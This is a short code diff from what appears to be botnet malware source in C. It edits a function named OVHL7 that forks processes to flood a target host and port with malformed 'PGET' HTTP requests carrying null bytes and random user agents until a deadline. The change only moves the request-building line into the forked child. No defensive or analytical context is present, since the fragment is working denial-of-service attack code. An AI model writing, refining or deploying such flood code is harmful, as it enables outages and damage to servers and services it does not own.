@@ -44,9 +44,9 @@ void OVHL7(char *host, in_port_t port, int timeEnd, int power)
 			"\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff");
 	for (i = 0; i < power; i++)
 	{
-		sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 58)]);
 		if (fork())
 		{
+			sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 58)]);
 			while (end > time(NULL))
 			{
 				socket = socket_connect(host, port);
